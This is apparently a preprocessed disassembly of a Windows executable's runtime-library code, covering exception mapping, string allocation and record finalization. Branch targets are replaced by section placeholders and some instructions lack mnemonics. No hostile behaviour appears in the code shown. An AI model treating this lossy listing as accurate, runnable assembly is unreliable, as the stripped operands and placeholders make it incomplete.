mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403a88
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403ab0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403af6
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b56
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403bb0
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_4059ac
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403bd4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_4059ac
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403bfc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c20
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403c7c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403cac
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403d38
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c20
call sub_403cac
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403ab0
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403a88
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405478
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403c7c
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e28
push ebp
mov ebp esp
call sub_403024
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4026ec
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403e60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403e28
push eax
push esi
push ebx
call sub_401224
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_403eac
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_403ed0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f00
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f70
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f44
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f70
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403f9c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f70
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403eac
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_403fcc
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403fec
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404008
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403eac
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4044f8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fcc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403fcc
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4044f8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403f9c
jmp r-xdata
sub_4040a4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403f9c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4040d4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404008
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40411c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403f9c
not ecx
sub_404148
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_404174
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f00
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4044f8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4044f8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_4041b8
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f00
test ecx ecx
je sub_403f00
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404174
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f70
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f00
pop edx
pop eax
jmp sub_404174
call sub_403f00
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40422c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f70
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4044f8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f00
dec [ edx - 0x8 ]
sub_4042b8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404378
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f70
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_4043cc
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403eac
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403f9c
jmp r-xdata
pop ebx
retn 0x4
sub_40440c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404378#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4044f8
mov edi ecx
sub_404454
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4044f8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044b0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4044f8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403eac
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f70
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4045a4
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4045c8
test edx edx
je sub_40458c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40458c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_4045ec
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40458c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4047d4
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fec
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403fec
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4047d4
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404678
jmp r-xdata
sub_404678
test ecx ecx
je sub_40458c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_40469c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404678
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404704
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404788
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4046f8
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404678
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4047d4
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40457c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404564
mov ebx eax
mov eax [ edi ]
call sub_4046f8
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_404818
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404848
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404848
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404848
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404818
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_4048dc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404928
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404928
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403ed0
jmp r-xdata
call sub_403eac
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045a4
jmp r-xdata
call sub_40458c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404910
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404928
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048dc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4054e8
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404e3c
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404a38
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_403f00
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4045c8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a20
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b54
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a38
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405500
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404e78
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404b54
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f00
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4045c8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
